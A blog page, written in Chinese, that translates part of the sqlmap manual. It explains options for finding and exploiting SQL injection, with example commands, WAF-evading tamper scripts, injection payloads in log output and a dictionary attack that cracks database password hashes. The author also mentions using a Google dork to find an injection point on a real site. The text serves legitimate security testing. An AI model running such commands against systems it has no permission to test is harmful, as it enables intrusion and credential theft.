@@ -1,0 +1,1764 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "\/"
+        },
+        "articleSection" : "2015",
+        "name" : "sqlmap用户手册",
+        "headline" : "sqlmap用户手册",
+        "description" : "当给sqlmap这么一个url的时候，它会： 1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，",
+        "inLanguage" : "en",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2015",
+        "datePublished": "2015-10-12 08:36:39 \x2b0000 \x2b0000",
+        "dateModified" : "2015-10-12 08:36:39 \x2b0000 \x2b0000",
+        "url" : "\/2015\/10\/2015-10-12-sqlmape794a8e688b7e6898be5868c\/",
+        "wordCount" : "12331",
+        "keywords" : [ "sqlmap","数据库","Blog" ]
+    }
+    </script>
+        
+            
+                <title>sqlmap用户手册</title>
+            
+        
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="generator" content="Hugo 0.55.6" />
+        
+
+
+        
+            <meta name="author" content="Mr9esx">
+        
+        
+            
+                <meta name="description" content="Mr9esx&#39;s Blog">
+            
+        
+
+        <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="sqlmap用户手册"/>
+<meta name="twitter:description" content="当给sqlmap这么一个url的时候，它会： 1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，"/>
+
+        <meta property="og:title" content="sqlmap用户手册" />
+<meta property="og:description" content="当给sqlmap这么一个url的时候，它会： 1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/2015/10/2015-10-12-sqlmape794a8e688b7e6898be5868c/" />
+<meta property="article:published_time" content="2015-10-12T08:36:39&#43;00:00"/>
+<meta property="article:modified_time" content="2015-10-12T08:36:39&#43;00:00"/>
+
+        <meta property="og:image" content="//images/logo.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="512">
+        <meta property="og:image:height" content="512">
+        
+<meta itemprop="name" content="sqlmap用户手册">
+<meta itemprop="description" content="当给sqlmap这么一个url的时候，它会： 1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，">
+
+
+<meta itemprop="datePublished" content="2015-10-12T08:36:39&#43;00:00" />
+<meta itemprop="dateModified" content="2015-10-12T08:36:39&#43;00:00" />
+<meta itemprop="wordCount" content="12331">
+
+
+
+<meta itemprop="keywords" content="sqlmap,数据库," />
+
+        
+
+        
+            
+        
+
+        
+        
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
+            <link rel="stylesheet" href="/css/main.css">
+            <link rel="stylesheet" href="/css/add-on.css">
+            <link rel="stylesheet" href="/css/academicons.min.css">
+        
+
+        
+            
+                
+            
+        
+
+
+  
+    
+    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
+  
+
+
+      
+    </head>
+    <body>
+
+      
+      <div id="wrapper">
+
+    
+    
+<header id="header">
+    
+      <h1><a href="/">NERVGEEK</a></h1>
+    
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/">
+                            <i class="">&nbsp;</i>Home
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories/%E5%BC%80%E5%8F%91-develop/">
+                            <i class="">&nbsp;</i>Develop
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/travel-list/">
+                            <i class="">&nbsp;</i>Travel List
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/dream-list/">
+                            <i class="">&nbsp;</i>Dream List
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://www.miaoplus.com/">
+                            <i class="">&nbsp;</i>Gallery
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about/">
+                            <i class="">&nbsp;</i>About Me
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            
+            <li class="search">
+                <a class="fa-search" href="#search">Search</a>
+                <form id="search" method="get" action="//google.com/search">
+                    <input type="text" name="q" placeholder="Search" />
+                    <input type="hidden" name="as_sitesearch" value="/">
+                </form>
+            </li>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <form class="search" method="get" action="//google.com/search">
+                <input type="text" name="q" placeholder="Search" />
+                <input type="hidden" name="as_sitesearch" value="/">
+            </form>
+        </section>
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/">
+                            <h3>
+                                <i class="">&nbsp;</i>Home
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories/%E5%BC%80%E5%8F%91-develop/">
+                            <h3>
+                                <i class="">&nbsp;</i>Develop
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/travel-list/">
+                            <h3>
+                                <i class="">&nbsp;</i>Travel List
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/dream-list/">
+                            <h3>
+                                <i class="">&nbsp;</i>Dream List
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://www.miaoplus.com/">
+                            <h3>
+                                <i class="">&nbsp;</i>Gallery
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/about/">
+                            <h3>
+                                <i class="">&nbsp;</i>About Me
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/2019/06/golang-interview-question/">Go 面试题</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-06-24'>
+                                    June 24, 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/2019/05/2019-05-09-windows-10-e4b88be79a84-go-micro-e5ae89e8a385e7ac94e8aeb0efbc88go-mod-e6a8a1e5bc8fefbc89/">Windows 10 下的 go-micro 安装笔记（go mod 模式）</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-05-09'>
+                                    May 9, 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/2019/04/2019-04-28-windows-10-e5ae89e8a385-golang-grpc/">Windows 10 安装 Golang gRpc</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-04-28'>
+                                    April 28, 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /
+                        
+                        class="button">View more posts</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="title">
+        
+            <h1><a href="/2015/10/2015-10-12-sqlmape794a8e688b7e6898be5868c/">sqlmap用户手册</a></h1>
+            
+        
+        
+    </div>
+    <div class="meta">
+        
+
+        <time class="published"
+            datetime='2015-10-12'>
+            October 12, 2015</time>
+        <span class="author">Mr9esx
+        
+            <p>25 minute read</p>
+        
+        
+    </div>
+</header>
+
+
+  
+    <section id="social-share">
+      <ul class="icons">
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    </section>
+  
+
+  
+
+  <div id="content">
+    
+
+<p>当给sqlmap这么一个url的时候，它会：</p>
+
+<pre><code>1、判断可注入的参数
+2、判断可以用那种SQL注入技术来注入
+3、识别出哪种数据库
+4、根据用户选择，读取哪些数据
+</code></pre>
+
+<p>sqlmap支持五种不同的注入模式：</p>
+
+<pre><code>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+4、联合查询注入，可以使用union的情况下的注入。
+5、堆查询注入，可以同时执行多条语句的执行时的注入。
+</code></pre>
+
+<p>sqlmap支持的数据库有：</p>
+
+<pre><code>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</code></pre>
+
+<p>可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。
+<!-- more -->
+测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。
+可以设定HTTP(S)请求的并发数，来提高盲注时的效率。
+Youtube上有人做的使用sqlmap的视频：
+<a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a>
+<a href="http://www.youtube.com/user/stamparm/videos">http://www.youtube.com/user/stamparm/videos</a>
+使用sqlmap的实例文章：
+<a href="http://unconciousmind.blogspot.com/search/label/sqlmap">http://unconciousmind.blogspot.com/search/label/sqlmap</a>
+可以点击<a href="https://github.com/sqlmapproject/sqlmap/tarball/master">https://github.com/sqlmapproject/sqlmap/tarball/master</a>下载最新版本sqlmap。
+也可以使用git来获取sqlmap</p>
+
+<pre><code>git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+</code></pre>
+
+<p>之后可以直接使用命令来更新</p>
+
+<pre><code>python sqlmap.py --update
+</code></pre>
+
+<p>或者</p>
+
+<pre><code>git pull
+</code></pre>
+
+<p>更新sqlmap
+如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。
+共有七个等级，默认为1：</p>
+
+<pre><code>0、只显示python错误以及严重的信息。
+1、同时显示基本信息和警告信息。（默认）
+2、同时显示debug信息。
+3、同时显示注入的payload。
+4、同时显示HTTP请求。
+5、同时显示HTTP响应头。
+6、同时显示HTTP响应页面。
+</code></pre>
+
+<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
+
+<h2 id="获取目标方式">获取目标方式</h2>
+
+<hr />
+
+<h3 id="目标url">目标URL</h3>
+
+<p>参数：-u或者&ndash;url
+格式：<code>http(s)://targeturl[:port]/[…]</code>
+例如：<code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code>
+从Burp或者WebScarab代理中获取日志
+参数：-l
+可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。</p>
+
+<h3 id="从文本中获取多个目标扫描">从文本中获取多个目标扫描</h3>
+
+<p>参数：-m
+文件中保存url格式如下，sqlmap会一个一个检测</p>
+
+<pre><code>www.target1.com/vuln1.php?q=foobar
+www.target2.com/vuln2.asp?id=1
+www.target3.com/vuln3/id/1*
+</code></pre>
+
+<h3 id="从文件中加载http请求">从文件中加载HTTP请求</h3>
+
+<p>参数：-r
+sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
+比如文本文件内如下：</p>
+
+<pre><code>POST /vuln.php HTTP/1.1
+Host: www.target.com
+User-Agent: Mozilla/4.0
+id=1
+</code></pre>
+
+<p>当请求是HTTPS的时候你需要配合这个&ndash;force-ssl参数来使用，或者你可以在Host头后面加上:443</p>
+
+<h3 id="处理google的搜索结果">处理Google的搜索结果</h3>
+
+<p>参数：-g
+sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。
+例子：</p>
+
+<pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;
+</code></pre>
+
+<p>（很牛B的功能，测试了一下，第十几个就找到新浪的一个注入点）
+此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p>
+
+<h2 id="请求">请求</h2>
+
+<hr />
+
+<h3 id="http数据">http数据</h3>
+
+<p>参数：&ndash;data
+此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。
+例子：</p>
+
+<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users
+</code></pre>
+
+<h3 id="参数拆分字符">参数拆分字符</h3>
+
+<p>参数：&ndash;param-del
+当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
+例子：</p>
+
+<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users
+</code></pre>
+
+<h3 id="http-cookie头">HTTP cookie头</h3>
+
+<p>参数：&ndash;cookie,&ndash;load-cookies,&ndash;drop-set-cookie
+这个参数在以下两个方面很有用：
+1、web应用需要登陆的时候。
+2、你想要在这些头参数中测试SQL注入时。
+可以通过抓包把cookie获取到，复制出来，然后加到&ndash;cookie参数里。
+在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。
+如果你不想接受Set-Cookie可以使用&ndash;drop-set-cookie参数来拒接。
+当你使用&ndash;cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当&ndash;level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p>
+
+<h3 id="http-user-agent头">HTTP User-Agent头</h3>
+
+<p>参数：&ndash;user-agent,&ndash;random-agent
+默认情况下sqlmap的HTTP请求头中User-Agent值是：</p>
+
+<pre><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
+</code></pre>
+
+<p>可以使用&ndash;user-anget参数来修改，同时也可以使用&ndash;random-agnet参数来随机的从./txt/user-agents.txt中获取。
+当&ndash;level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p>
+
+<h3 id="http-referer头">HTTP Referer头</h3>
+
+<p>参数：&ndash;referer
+sqlmap可以在请求中伪造HTTP中的referer，当&ndash;level参数设定为3或者3以上的时候会尝试对referer注入。</p>
+
+<h3 id="额外的http头">额外的HTTP头</h3>
+
+<p>参数：&ndash;headers
+可以通过&ndash;headers参数来增加额外的http头</p>
+
+<h3 id="http认证保护">HTTP认证保护</h3>
+
+<p>参数：&ndash;auth-type,&ndash;auth-cred
+这些参数可以用来登陆HTTP的认证保护支持三种方式：
+1、Basic
+2、Digest
+3、NTLM
+例子：</p>
+
+<pre><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;
+</code></pre>
+
+<h3 id="http协议的证书认证">HTTP协议的证书认证</h3>
+
+<p>参数：&ndash;auth-cert
+当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。
+key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
+
+<h3 id="http-s-代理">HTTP(S)代理</h3>
+
+<p>参数：&ndash;proxy,&ndash;proxy-cred和&ndash;ignore-proxy
+使用&ndash;proxy代理是格式为：<a href="http://url:port。">http://url:port。</a>
+当HTTP(S)代理需要认证是可以使用&ndash;proxy-cred参数：username:password。
+&ndash;ignore-proxy拒绝使用本地局域网的HTTP(S)代理。</p>
+
+<h3 id="http请求延迟">HTTP请求延迟</h3>
+
+<p>参数：&ndash;delay
+可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+
+<h3 id="设定超时时间">设定超时时间</h3>
+
+<p>参数：&ndash;timeout
+可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p>
+
+<h3 id="设定重试超时">设定重试超时</h3>
+
+<p>参数：&ndash;retries
+当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
+
+<h3 id="设定随机改变的参数值">设定随机改变的参数值</h3>
+
+<p>参数：&ndash;randomize
+可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p>
+
+<h3 id="利用正则过滤目标网址">利用正则过滤目标网址</h3>
+
+<p>参数：&ndash;scope
+例如：</p>
+
+<pre><code>python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;
+</code></pre>
+
+<h3 id="避免过多的错误请求被屏蔽">避免过多的错误请求被屏蔽</h3>
+
+<p>参数：&ndash;safe-url,&ndash;safe-freq
+有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
+绕过这个策略有两种方式：</p>
+
+<pre><code>1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
+2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
+</code></pre>
+
+<h3 id="关掉url参数值编码">关掉URL参数值编码</h3>
+
+<p>参数：&ndash;skip-urlencode
+根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用&ndash;skip-urlencode参数。</p>
+
+<h3 id="每次请求时候执行自定义的python代码">每次请求时候执行自定义的python代码</h3>
+
+<p>参数：&ndash;eval
+在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用&ndash;eval参数在每次请求时根据所写python代码做完修改后请求。
+例子：</p>
+
+<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
+</code></pre>
+
+<p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p>
+
+<h2 id="注入">注入</h2>
+
+<hr />
+
+<h2 id="测试参数">测试参数</h2>
+
+<p>参数：-p,&ndash;skip
+sqlmap默认测试所有的GET和POST参数，当&ndash;level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p &ldquo;id,user-anget&rdquo;
+当你使用&ndash;level的值很大但是有个别参数不想测试的时候可以使用&ndash;skip参数。
+例如：&ndash;skip=&ldquo;user-angent.referer&rdquo;
+在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*
+例如：</p>
+
+<pre><code>python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;
+</code></pre>
+
+<p>sqlmap将会测试value1的位置是否可注入。</p>
+
+<h3 id="指定数据库">指定数据库</h3>
+
+<p>参数：&ndash;dbms
+默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：</p>
+
+<pre><code>MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
+</code></pre>
+
+<h3 id="指定数据库服务器系统">指定数据库服务器系统</h3>
+
+<p>参数：&ndash;os
+默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p>
+
+<h3 id="指定无效的大数字">指定无效的大数字</h3>
+
+<p>参数：&ndash;invalid-bignum
+当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</p>
+
+<h3 id="只定无效的逻辑">只定无效的逻辑</h3>
+
+<p>参数：&ndash;invalid-logical
+原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。</p>
+
+<h3 id="注入payload">注入payload</h3>
+
+<p>参数：&ndash;prefix,&ndash;suffix
+在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。
+例如，代码中是这样调用数据库的：</p>
+
+<pre><code>$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;
+</code></pre>
+
+<p>这时你就需要&ndash;prefix和&ndash;suffix参数了：</p>
+
+<pre><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;
+</code></pre>
+
+<p>这样执行的SQL语句变成：</p>
+
+<pre><code>$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;
+</code></pre>
+
+<h3 id="修改注入的数据">修改注入的数据</h3>
+
+<p>参数：&ndash;tamper
+sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用&ndash;tamper参数对数据做修改来绕过WAF等设备。
+下面是一个tamper脚本的格式：</p>
+
+<pre><code># Needed imports
+from lib.core.enums import PRIORITY
+# Define which is the order of application of tamper scripts against
+# the payload
+__priority__ = PRIORITY.NORMAL
+def tamper(payload):
+    '''
+    Description of your tamper script
+    '''
+    retVal = payload
+    # your code to tamper the original payload
+    # return the tampered payload
+    return retVal
+</code></pre>
+
+<p>可以查看 tamper/ 目录下的有哪些可用的脚本
+例如：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+[hh:mm:03] [DEBUG] cleaning up configuration parameters
+[hh:mm:03] [INFO] loading tamper script 'between'
+[hh:mm:03] [INFO] loading tamper script 'randomcase'
+[hh:mm:03] [INFO] loading tamper script 'space2comment'
+[...]
+[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
+[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
+[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
+[...]
+[hh:mm:04] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'
+[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
+58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
+ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
+group/**/bY/**/x)a)
+[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING
+clause' injectable
+[...]
+</code></pre>
+
+<h2 id="探测">探测</h2>
+
+<hr />
+
+<h3 id="探测等级">探测等级</h3>
+
+<p>参数：&ndash;level
+共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。
+这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。
+总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
+
+<h3 id="风险等级">风险等级</h3>
+
+<p>参数：&ndash;risk
+共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
+在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。
+测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
+
+<h3 id="页面比较">页面比较</h3>
+
+<p>参数：&ndash;string,&ndash;not-string,&ndash;regexp,&ndash;code
+默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用&ndash;string参数添加字符串，&ndash;regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（&ndash;not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数&ndash;code=200。
+参数：&ndash;text-only,&ndash;titles
+有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用&ndash;text-only（HTTP响应体中不同）&ndash;titles（HTML的title标签中不同）。</p>
+
+<h2 id="注入技术">注入技术</h2>
+
+<hr />
+
+<h3 id="测试是否是注入">测试是否是注入</h3>
+
+<p>参数：&ndash;technique
+这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。
+支持的探测方式如下：</p>
+
+<pre><code>B: Boolean-based blind SQL injection（布尔型注入）
+E: Error-based SQL injection（报错型注入）
+U: UNION query SQL injection（可联合查询注入）
+S: Stacked queries SQL injection（可多语句查询注入）
+T: Time-based blind SQL injection（基于时间延迟注入）
+</code></pre>
+
+<h3 id="设定延迟注入的时间">设定延迟注入的时间</h3>
+
+<p>参数：&ndash;time-sec
+当使用继续时间的盲注时，时刻使用&ndash;time-sec参数设定延时时间，默认是5秒。</p>
+
+<h3 id="设定union查询字段数">设定UNION查询字段数</h3>
+
+<p>参数：&ndash;union-cols
+默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当&ndash;level为5的时候他会增加测试到50个字段数。设定&ndash;union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
+
+<h3 id="设定union查询使用的字符">设定UNION查询使用的字符</h3>
+
+<p>参数：&ndash;union-char
+默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用&ndash;union-char只定UNION查询的字符。</p>
+
+<h3 id="二阶sql注入">二阶SQL注入</h3>
+
+<p>参数：&ndash;second-order
+有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。&ndash;second-order后面跟一个判断页面的URL地址。</p>
+
+<h2 id="列数据">列数据</h2>
+
+<hr />
+
+<h3 id="标志">标志</h3>
+
+<p>参数：-b,&ndash;banner
+大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
+
+<h3 id="用户">用户</h3>
+
+<p>参数：-current-user
+在大多数据库中可以获取到管理数据的用户。</p>
+
+<h3 id="当前数据库">当前数据库</h3>
+
+<p>参数：&ndash;current-db
+返还当前连接的数据库。</p>
+
+<h3 id="当前用户是否为管理用">当前用户是否为管理用</h3>
+
+<p>参数：&ndash;is-dba
+判断当前的用户是否为管理，是的话会返回True。</p>
+
+<h3 id="列数据库管理用户">列数据库管理用户</h3>
+
+<p>参数：&ndash;users
+当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
+
+<h3 id="列出并破解数据库用户的hash">列出并破解数据库用户的hash</h3>
+
+<p>参数：&ndash;passwords
+当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
+例子：</p>
+
+<pre><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --passwords -v 1
+[...]
+back-end DBMS: PostgreSQL
+[hh:mm:38] [INFO] fetching database users password hashes
+do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
+[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
+what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]
+[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
+do you want to use common password suffixes? (slow!) [y/N] n
+[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
+[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
+[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
+database management system users password hashes:
+[*] postgres [1]:
+    password hash: md5d7d880f96044b72d0bba108ace96d1e4
+    clear-text password: testpass
+[*] testuser [1]:
+    password hash: md599e5ea7a6f7c3269995cba3927fd0093
+    clear-text password: testpass
+</code></pre>
+
+<p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。
+也可以提供-U参数来指定爆破哪个用户的hash。</p>
+
+<h3 id="列出数据库管理员权限">列出数据库管理员权限</h3>
+
+<p>参数：&ndash;privileges
+当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p>
+
+<h3 id="列出数据库管理员角色">列出数据库管理员角色</h3>
+
+<p>参数：&ndash;roles
+当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。
+仅适用于当前数据库是Oracle的时候。</p>
+
